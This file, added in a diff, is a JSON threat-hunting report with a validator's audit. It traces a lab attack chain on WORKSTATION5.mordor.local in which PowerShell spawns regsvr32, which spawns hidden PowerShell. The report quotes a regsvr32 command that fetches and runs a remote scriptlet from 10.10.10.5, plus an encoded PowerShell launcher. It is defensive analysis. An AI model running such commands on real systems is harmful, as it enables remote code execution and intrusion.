@@ -1,0 +1,363 @@
+{
+  "raw_report_before_sanitize": {
+    "schema_version": "threat-hunting-report/v1",
+    "verdict": "SUSPICIOUS",
+    "direct_answer": "Trong chuỗi quan sát được trên host WORKSTATION5.mordor.local: regsvr32.exe (PID 9384, GUID {b59756a9-b238-5f17-5207-000000000400}) là process đi cổng 8444 tới 10.10.10.5 với 1 observation (jsonl:line:1001); powershell.exe con (PID 9076, GUID {b59756a9-b239-5f17-5307-000000000400}) là process đi cổng 80 tới 10.10.10.5 với 9 observations (jsonl:line:1189, 1192, 1213, 1284, 1323, 1363, 1401, 1437, 2154). Liên kết process–connection là inferred theo host/GUID/lifetime; creation được dedup theo cặp Sysmon EID1 + Security 4688 cho cùng một lần tạo; PID chỉ dùng fallback có giới hạn và dừng ở lần creation/exit kế tiếp.",
+    "executive_summary": "Chuỗi parent/child quan sát được: powershell.exe cha (PID 8648, GUID {b59756a9-89dc-5f17-1006-000000000400}) tạo regsvr32.exe (jsonl:line:97, jsonl:line:219); regsvr32.exe tạo powershell.exe con (jsonl:line:224, jsonl:line:283). Network: regsvr32.exe → 10.10.10.5:8444 (1 observation, jsonl:line:1001); powershell.exe con → 10.10.10.5:80 (9 observations). Đây là suspicious network context, chưa xác nhận C2; connection không chứng minh HTTP hoàn tất hay exfiltration.",
+    "technical_analysis": "Host: WORKSTATION5.mordor.local. Chuỗi creation (mỗi lần tạo có hai view Sysmon EID1 và Security 4688, dedup thành một creation): (1) powershell.exe PID 8648 (GUID {b59756a9-89dc-5f17-1006-000000000400}) → regsvr32.exe PID 9384 (GUID {b59756a9-b238-5f17-5207-000000000400}), command line regsvr32 /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll (jsonl:line:97 Sysmon 03:27:53.548Z; jsonl:line:219 Security 03:27:53.590Z). (2) regsvr32.exe PID 9384 → powershell.exe PID 9076 (GUID {b59756a9-b239-5f17-5307-000000000400}), command line powershell -noP -sta -w 1 -enc ... (jsonl:line:224 Sysmon 03:27:54.604Z; jsonl:line:283 Security 03:27:54.620Z). (3) powershell.exe PID 9076 → conhost.exe PID 4856 (jsonl:line:240, jsonl:line:296). Network: regsvr32.exe PID 9384 → 10.10.10.5:8444, 1 observation (jsonl:line:1001, 03:27:55.955Z); powershell.exe PID 9076 → 10.10.10.5:80, 9 observations (jsonl:line:1189 03:27:57.014Z; 1192 03:27:57.015Z; 1213 03:27:58.011Z; 1284 03:28:04.036Z; 1323 03:28:09.056Z; 1363 03:28:13.084Z; 1401 03:28:19.115Z; 1437 03:28:24.161Z; 2154 03:28:28.429Z). Host/GUID: liên kết process–connection dựa trên host_guid_lifetime (inferred_correlation), không phải quan hệ observed trực tiếp; GUID trùng host và lifetime, PID chỉ là fallback. Dedup creation: mỗi cặp Sysmon EID1 + Security 4688 mô tả cùng một creation, không đếm hai lần. PID reuse: policy dừng fallback PID tại lần creation/exit kế tiếp, tối đa 120 giây; GUID xung đột image/lifetime bị loại. Khoảng dấu thời gian canonical của các observations được chọn là 2020-07-22T03:27:53.548Z → 2020-07-22T03:28:28.429Z; đây không phải thời lượng thực của hoạt động tấn công và không chứng minh đồng bộ đồng hồ giữa các nguồn. Các connection chỉ là Sysmon EID3; không chứng minh HTTP completion, nội dung, số byte, C2 xác nhận hay exfiltration.",
+    "attack_chain": [
+      {
+        "step_number": 1,
+        "source_entity": "powershell.exe PID 8648 (GUID {b59756a9-89dc-5f17-1006-000000000400})",
+        "action": "process_spawn",
+        "target_entity": "regsvr32.exe PID 9384 (GUID {b59756a9-b238-5f17-5207-000000000400})",
+        "evidence_ref": "jsonl:line:97; jsonl:line:219",
+        "timestamp": "2020-07-22T03:27:53.548000Z"
+      },
+      {
+        "step_number": 2,
+        "source_entity": "regsvr32.exe PID 9384 (GUID {b59756a9-b238-5f17-5207-000000000400})",
+        "action": "process_spawn",
+        "target_entity": "powershell.exe PID 9076 (GUID {b59756a9-b239-5f17-5307-000000000400})",
+        "evidence_ref": "jsonl:line:224; jsonl:line:283",
+        "timestamp": "2020-07-22T03:27:54.604000Z"
+      },
+      {
+        "step_number": 3,
+        "source_entity": "regsvr32.exe PID 9384 (GUID {b59756a9-b238-5f17-5207-000000000400})",
+        "action": "network_connect",
+        "target_entity": "10.10.10.5:8444",
+        "evidence_ref": "jsonl:line:1001",
+        "timestamp": "2020-07-22T03:27:55.955000Z"
+      },
+      {
+        "step_number": 4,
+        "source_entity": "powershell.exe PID 9076 (GUID {b59756a9-b239-5f17-5307-000000000400})",
+        "action": "network_connect",
+        "target_entity": "10.10.10.5:80",
+        "evidence_ref": "jsonl:line:1189; jsonl:line:1192; jsonl:line:1213; jsonl:line:1284; jsonl:line:1323; jsonl:line:1363; jsonl:line:1401; jsonl:line:1437; jsonl:line:2154",
+        "timestamp": "2020-07-22T03:27:57.014000Z"
+      }
+    ],
+    "mitre_mappings": [
+      {
+        "technique_id": "T1218.010",
+        "technique_name": "Regsvr32",
+        "confidence": "supported_by_observed_behavior",
+        "rationale": "HTTP scriptlet regsvr32 command and parent/child evidence support suspected system binary proxy execution. Network endpoints do not prove C2 purpose.",
+        "evidence_support": "supported_by_observed_behavior",
+        "assessment_status": "candidate",
+        "review_status": "needs_review"
+      }
+    ],
+    "sigma_matches": [
+      "2dd2c217-bf68-437a-b57c-fe9fd01d5de8",
+      "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
+      "ab37a6ec-6068-432b-a64e-2c7bf95b1d22"
+    ],
+    "containment_recommendations": [],
+    "unverified_claims": [
+      "Các connection Sysmon EID3 không chứng minh HTTP exchange hoàn tất, nội dung truyền, số byte hoặc exfiltration.",
+      "Mục đích C2 chưa được xác nhận; assessment nguồn là suspicious_network_context_not_confirmed_C2.",
+      "Liên kết process–connection là inferred theo host/GUID/lifetime, không phải quan hệ observed trực tiếp.",
+      "Khoảng dấu thời gian canonical của các observations được chọn không phải thời lượng thực của hoạt động tấn công và không chứng minh đồng bộ đồng hồ giữa các nguồn.",
+      "PID fallback có giới hạn (tối đa 120 giây, dừng tại lần creation/exit kế tiếp); PID reuse có thể làm mơ hồ liên kết nếu không có GUID.",
+      "Context/slice này chưa đủ để kết luận về toàn bộ dataset hoặc các hành vi ngoài các observation được cung cấp."
+    ],
+    "evidence_refs": [
+      "jsonl:line:97",
+      "jsonl:line:219",
+      "jsonl:line:224",
+      "jsonl:line:283",
+      "jsonl:line:240",
+      "jsonl:line:296",
+      "jsonl:line:1001",
+      "jsonl:line:1189",
+      "jsonl:line:1192",
+      "jsonl:line:1213",
+      "jsonl:line:1284",
+      "jsonl:line:1323",
+      "jsonl:line:1363",
+      "jsonl:line:1401",
+      "jsonl:line:1437",
+      "jsonl:line:2154",
+      "creation-process-1356a3e1f91322ca",
+      "creation-process-1a7b3c442952cc5a",
+      "creation-process-73835839c8774e70",
+      "connections-process-1356a3e1f91322ca",
+      "connections-process-1a7b3c442952cc5a",
+      "network-process-1356a3e1f91322ca",
+      "network-process-1a7b3c442952cc5a",
+      "process-network-timeline",
+      "assessment-T1218-010"
+    ]
+  },
+  "sanitized_report": {
+    "schema_version": "threat-hunting-report/v1",
+    "verdict": "INSUFFICIENT_EVIDENCE",
+    "direct_answer": "Trong chuỗi quan sát được trên host WORKSTATION5.mordor.local: regsvr32.exe (PID 9384, GUID {b59756a9-b238-5f17-5207-000000000400}) là process đi cổng 8444 tới 10.10.10.5 với 1 observation (jsonl:line:1001); powershell.exe con (PID 9076, GUID {b59756a9-b239-5f17-5307-000000000400}) là process đi cổng 80 tới 10.10.10.5 với 9 observations (jsonl:line:1189, 1192, 1213, 1284, 1323, 1363, 1401, 1437, 2154). Liên kết process–connection là inferred theo host/GUID/lifetime; creation được dedup theo cặp Sysmon EID1 + Security 4688 cho cùng một lần tạo; PID chỉ dùng fallback có giới hạn và dừng ở lần creation/exit kế tiếp.",
+    "executive_summary": "Chuỗi parent/child quan sát được: powershell.exe cha (PID 8648, GUID {b59756a9-89dc-5f17-1006-000000000400}) tạo regsvr32.exe (jsonl:line:97, jsonl:line:219); regsvr32.exe tạo powershell.exe con (jsonl:line:224, jsonl:line:283). Network: regsvr32.exe → 10.10.10.5:8444 (1 observation, jsonl:line:1001); powershell.exe con → 10.10.10.5:80 (9 observations). Đây là suspicious network context, chưa xác nhận C2; connection không chứng minh HTTP hoàn tất hay exfiltration.",
+    "technical_analysis": "Host: WORKSTATION5.mordor.local. Chuỗi creation (mỗi lần tạo có hai view Sysmon EID1 và Security 4688, dedup thành một creation): (1) powershell.exe PID 8648 (GUID {b59756a9-89dc-5f17-1006-000000000400}) → regsvr32.exe PID 9384 (GUID {b59756a9-b238-5f17-5207-000000000400}), command line regsvr32 /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll (jsonl:line:97 Sysmon 03:27:53.548Z; jsonl:line:219 Security 03:27:53.590Z). (2) regsvr32.exe PID 9384 → powershell.exe PID 9076 (GUID {b59756a9-b239-5f17-5307-000000000400}), command line powershell -noP -sta -w 1 -enc ... (jsonl:line:224 Sysmon 03:27:54.604Z; jsonl:line:283 Security 03:27:54.620Z). (3) powershell.exe PID 9076 → conhost.exe PID 4856 (jsonl:line:240, jsonl:line:296). Network: regsvr32.exe PID 9384 → 10.10.10.5:8444, 1 observation (jsonl:line:1001, 03:27:55.955Z); powershell.exe PID 9076 → 10.10.10.5:80, 9 observations (jsonl:line:1189 03:27:57.014Z; 1192 03:27:57.015Z; 1213 03:27:58.011Z; 1284 03:28:04.036Z; 1323 03:28:09.056Z; 1363 03:28:13.084Z; 1401 03:28:19.115Z; 1437 03:28:24.161Z; 2154 03:28:28.429Z). Host/GUID: liên kết process–connection dựa trên host_guid_lifetime (inferred_correlation), không phải quan hệ observed trực tiếp; GUID trùng host và lifetime, PID chỉ là fallback. Dedup creation: mỗi cặp Sysmon EID1 + Security 4688 mô tả cùng một creation, không đếm hai lần. PID reuse: policy dừng fallback PID tại lần creation/exit kế tiếp, tối đa 120 giây; GUID xung đột image/lifetime bị loại. Khoảng dấu thời gian canonical của các observations được chọn là 2020-07-22T03:27:53.548Z → 2020-07-22T03:28:28.429Z; đây không phải thời lượng thực của hoạt động tấn công và không chứng minh đồng bộ đồng hồ giữa các nguồn. Các connection chỉ là Sysmon EID3; không chứng minh HTTP completion, nội dung, số byte, C2 xác nhận hay exfiltration.",
+    "attack_chain": [
+      {
+        "step_number": 3,
+        "source_entity": "regsvr32.exe PID 9384 (GUID {b59756a9-b238-5f17-5207-000000000400})",
+        "action": "network_connect",
+        "target_entity": "10.10.10.5:8444",
+        "evidence_ref": "jsonl:line:1001",
+        "timestamp": "2020-07-22T03:27:55.955000Z"
+      }
+    ],
+    "mitre_mappings": [
+      {
+        "technique_id": "T1218.010",
+        "technique_name": "Regsvr32",
+        "confidence": "supported_by_observed_behavior",
+        "rationale": "HTTP scriptlet regsvr32 command and parent/child evidence support suspected system binary proxy execution. Network endpoints do not prove C2 purpose.",
+        "evidence_support": "supported_by_observed_behavior",
+        "assessment_status": "candidate",
+        "review_status": "needs_review"
+      }
+    ],
+    "sigma_matches": [
+      "2dd2c217-bf68-437a-b57c-fe9fd01d5de8",
+      "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
+      "ab37a6ec-6068-432b-a64e-2c7bf95b1d22"
+    ],
+    "containment_recommendations": [],
+    "unverified_claims": [
+      "Các connection Sysmon EID3 không chứng minh HTTP exchange hoàn tất, nội dung truyền, số byte hoặc exfiltration.",
+      "Mục đích C2 chưa được xác nhận; assessment nguồn là suspicious_network_context_not_confirmed_C2.",
+      "Liên kết process–connection là inferred theo host/GUID/lifetime, không phải quan hệ observed trực tiếp.",
+      "Khoảng dấu thời gian canonical của các observations được chọn không phải thời lượng thực của hoạt động tấn công và không chứng minh đồng bộ đồng hồ giữa các nguồn.",
+      "PID fallback có giới hạn (tối đa 120 giây, dừng tại lần creation/exit kế tiếp); PID reuse có thể làm mơ hồ liên kết nếu không có GUID.",
+      "Context/slice này chưa đủ để kết luận về toàn bộ dataset hoặc các hành vi ngoài các observation được cung cấp.",
+      "unknown_reference: Not an exact structured ID or pointer in supplied context. (jsonl:line:97; jsonl:line:219)",
+      "unknown_reference: Not an exact structured ID or pointer in supplied context. (jsonl:line:224; jsonl:line:283)",
+      "unknown_reference: Not an exact structured ID or pointer in supplied context. (jsonl:line:1189; jsonl:line:1192; jsonl:line:1213; jsonl:line:1284; jsonl:line:1323; jsonl:line:1363; jsonl:line:1401; jsonl:line:1437; jsonl:line:2154)",
+      "unsupported_step: Cited fields do not establish this subject/action/object/timestamp; removed from checked chain. (jsonl:line:97; jsonl:line:219)",
+      "unsupported_step: Cited fields do not establish this subject/action/object/timestamp; removed from checked chain. (jsonl:line:224; jsonl:line:283)",
+      "unsupported_step: Cited fields do not establish this subject/action/object/timestamp; removed from checked chain. (jsonl:line:1189; jsonl:line:1192; jsonl:line:1213; jsonl:line:1284; jsonl:line:1323; jsonl:line:1363; jsonl:line:1401; jsonl:line:1437; jsonl:line:2154)"
+    ],
+    "evidence_refs": [
+      "jsonl:line:97",
+      "jsonl:line:219",
+      "jsonl:line:224",
+      "jsonl:line:283",
+      "jsonl:line:240",
+      "jsonl:line:296",
+      "jsonl:line:1001",
+      "jsonl:line:1189",
+      "jsonl:line:1192",
+      "jsonl:line:1213",
+      "jsonl:line:1284",
+      "jsonl:line:1323",
+      "jsonl:line:1363",
+      "jsonl:line:1401",
+      "jsonl:line:1437",
+      "jsonl:line:2154",
+      "creation-process-1356a3e1f91322ca",
+      "creation-process-1a7b3c442952cc5a",
+      "creation-process-73835839c8774e70",
+      "connections-process-1356a3e1f91322ca",
+      "connections-process-1a7b3c442952cc5a",
+      "network-process-1356a3e1f91322ca",
+      "network-process-1a7b3c442952cc5a",
+      "process-network-timeline",
+      "assessment-T1218-010"
+    ]
+  },
+  "status": "validation_failed",
+  "scope": "structured claims + bounded process citation, duration, request-topic and authentication Status/SubStatus binding checks; remaining prose/comparison correctness unverified",
+  "issues": [
+    {
+      "code": "unknown_reference",
+      "path": "evidence_refs",
+      "reason": "Not an exact structured ID or pointer in supplied context.",
+      "reference": "jsonl:line:97; jsonl:line:219"
+    },
+    {
+      "code": "unknown_reference",
+      "path": "evidence_refs",
+      "reason": "Not an exact structured ID or pointer in supplied context.",
+      "reference": "jsonl:line:224; jsonl:line:283"
+    },
+    {
+      "code": "unknown_reference",
+      "path": "evidence_refs",
+      "reason": "Not an exact structured ID or pointer in supplied context.",
+      "reference": "jsonl:line:1189; jsonl:line:1192; jsonl:line:1213; jsonl:line:1284; jsonl:line:1323; jsonl:line:1363; jsonl:line:1401; jsonl:line:1437; jsonl:line:2154"
+    },
+    {
+      "code": "unsupported_step",
+      "path": "attack_chain/0",
+      "reason": "Cited fields do not establish this subject/action/object/timestamp; removed from checked chain.",
+      "reference": "jsonl:line:97; jsonl:line:219"
+    },
+    {
+      "code": "unsupported_step",
+      "path": "attack_chain/1",
+      "reason": "Cited fields do not establish this subject/action/object/timestamp; removed from checked chain.",
+      "reference": "jsonl:line:224; jsonl:line:283"
+    },
+    {
+      "code": "unsupported_step",
+      "path": "attack_chain/3",
+      "reason": "Cited fields do not establish this subject/action/object/timestamp; removed from checked chain.",
+      "reference": "jsonl:line:1189; jsonl:line:1192; jsonl:line:1213; jsonl:line:1284; jsonl:line:1323; jsonl:line:1363; jsonl:line:1401; jsonl:line:1437; jsonl:line:2154"
+    }
+  ],
+  "reference_checks": [
+    {
+      "reference": "jsonl:line:97",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:219",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:224",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:283",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:240",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:296",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:1001",
+      "status": "supports_structured_claim"
+    },
+    {
+      "reference": "jsonl:line:1189",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:1192",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:1213",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:1284",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:1323",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:1363",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:1401",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:1437",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:2154",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "creation-process-1356a3e1f91322ca",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "creation-process-1a7b3c442952cc5a",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "creation-process-73835839c8774e70",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "connections-process-1356a3e1f91322ca",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "connections-process-1a7b3c442952cc5a",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "network-process-1356a3e1f91322ca",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "network-process-1a7b3c442952cc5a",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "process-network-timeline",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "assessment-T1218-010",
+      "status": "exists_unverified"
+    },
+    {
+      "reference": "jsonl:line:97; jsonl:line:219",
+      "status": "invalid_removed"
+    },
+    {
+      "reference": "jsonl:line:224; jsonl:line:283",
+      "status": "invalid_removed"
+    },
+    {
+      "reference": "jsonl:line:1189; jsonl:line:1192; jsonl:line:1213; jsonl:line:1284; jsonl:line:1323; jsonl:line:1363; jsonl:line:1401; jsonl:line:1437; jsonl:line:2154",
+      "status": "invalid_removed"
+    }
+  ],
+  "unverified_fields": [
+    "verdict",
+    "direct_answer",
+    "executive_summary",
+    "technical_analysis",
+    "containment_recommendations",
+    "sigma_matches"
+  ],
+  "human_review_required": true,
+  "narrative_binding_audit": {
+    "scope": "explicit positive executable-parent/creation-verb/executable-child clauses with inline references only",
+    "checks": [
+      {
+        "field": "executive_summary",
+        "references": [
+          "jsonl:line:97",
+          "jsonl:line:219",
+          "jsonl:line:224",
+          "jsonl:line:283"
+        ],
+        "status": "supported"
+      }
+    ],
+    "issues": [],
+    "remaining_prose": "unverified; human review required"
+  },
+  "clock_and_scope_audit": {
+    "scope": "explicit numeric authentication-duration expressions and asserted HTTP/C2/exfiltration topics only; negated boundary caveats are permitted",
+    "checks": [],
+    "issues": [],
+    "comparison_semantics": "requires offline rubric review, not automatically verified",
+    "remaining_prose": "unverified; AI/human semantic review remains necessary"
+  },
+  "auth_field_binding_audit": {
+    "scope": "no supplied authentication observations; not applicable",
+    "events_in_context": [],
+    "checks": [],
+    "issues": []
+  }
+}
